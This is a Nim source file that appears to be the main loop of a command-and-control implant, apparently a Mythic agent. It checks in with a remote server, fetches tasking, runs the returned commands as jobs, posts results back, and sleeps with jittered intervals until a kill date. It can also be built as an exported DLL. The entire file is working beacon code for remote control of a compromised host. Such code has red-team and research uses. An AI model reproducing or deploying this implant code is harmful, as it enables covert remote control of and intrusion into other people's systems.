import algorithm
import asyncdispatch
import base64
import json
from strutils import split
import ../utils/http
import ../utils/checkin
import ../utils/config
import ../utils/job
import ../utils/task

import ../utils/debug

var curConfig = createConfig()
var runningJobs: seq[Job]

proc error*(message: string, exception: ref Exception) =
    echo message
    echo exception.getStackTrace()

proc getTasks* : Future[seq[Task]] {.async.} = 
    var tasks: seq[Task]
    let taskJson = %*{"action" : "get_tasking", "tasking_size": -1 }
    debugMsg("Attempting to get tasks")
    let data = when defined(AESPSK): $(taskJson) else: encode(curConfig.PayloadUUID & $(taskJson), true) 
    debugMsg("attempting to get tasks with this data: " & data)
    let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
    debugMsg("decoded temp: " & temp)
    if(cmp(temp[0 .. 35], curConfig.PayloadUUID) != 0):
        debugMsg("Payload UUID do not match when fetching tasks something is wrong...")
        return tasks
    # https://nim-lang.org/docs/system.html#%5E.t%2Cint
    echo "length of temp: ", len(temp)
    var resp = parseJson(temp[36 .. ^1])
    for jnode in getElems(resp["tasks"]):
        debugMsg("Jnode: ", jnode)
        tasks.add(Task(action: jnode["command"].getStr(), id: jnode["id"].getStr(), parameters: jnode["parameters"].getStr(), timestamp: jnode["timestamp"].getFloat()))
    # Sort by tasks' timestamps to get most recent tasks 
    tasks.sort(taskCmp)
    result = tasks
    debugMsg("Sorted result: " & $(result))


proc checkIn: Future[bool] {.async.} = 
    var check = createCheckIn(curConfig)
    debugMsg("Checkin has been created: ", $(check))

    let data = when defined(AESPSK): checkintojson(check) else: encode(curConfig.PayloadUUID & checkintojson(check), true)
    try:
        # Send initial checkin and parse json response into JsonNode
        let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
        debugMsg("decoded temp: " & $(temp))
        var resp = parseJson(temp[36 .. ^1])
        debugMsg("resp from checkin: " & $(resp))
        if(cmp(resp["status"].getStr(), "success")) == 0:
            curConfig.PayloadUUID = resp["id"].getStr()
            debugMsg("Updated curconfig payloaduuid ", curConfig.PayloadUUID, " to ", resp["id"].getStr())
            result = true
        else:
            result = false
    except:
        let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
        debugMsg("Inside checkIn, got exception ", repr(e), " with message ", msg)
        error("stacktrace", e)
        result = false

# Determine during compile time if being compiled as a DLL export main proc
when appType == "lib":
  {.pragma: rtl, exportc, dynlib, cdecl.}
else:
  {.pragma: rtl, }

proc main() {.async, rtl.} = 
    while (not await checkin()):
        let dwell = genSleepTime(curConfig)
        debugMsg("checkin is false", "dwell: ", dwell)
        await sleepAsync(dwell)
        debugMsg("Checked in with curConfig of: " & $(curConfig))
    while true:
        if(checkDate(curConfig.KillDate)):
            quit(QuitSuccess)
        let tasks = await getTasks()
        debugMsg("tasks: ", $(tasks))
        debugMsg("inside base and runningJobs: ", $(runningJobs))
        let resJobLauncherTup = await jobLauncher(runningJobs, tasks, curConfig)
        # Update config and obtain runnings jobs
        runningJobs = resJobLauncherTup.jobs
        curConfig = resJobLauncherTup.newConfig

        debugMsg("running jobs from joblauncher: ", $(runningJobs))
        let postResptuple =  await postUp(curConfig, runningJobs)
        debugMsg("jobs returned from postUp: ", $(postResptuple.resSeq))

        runningJobs = postResptuple.resSeq
        debugMsg("runningJobs after setting it equal to postresptuple.resSeq: ", $(runningJobs))
        debugMsg("postResp: ", postResptuple.postupResp)
            
        let dwell = genSleepTime(curConfig)
        await sleepAsync(dwell)

when appType != "lib":
    waitFor main()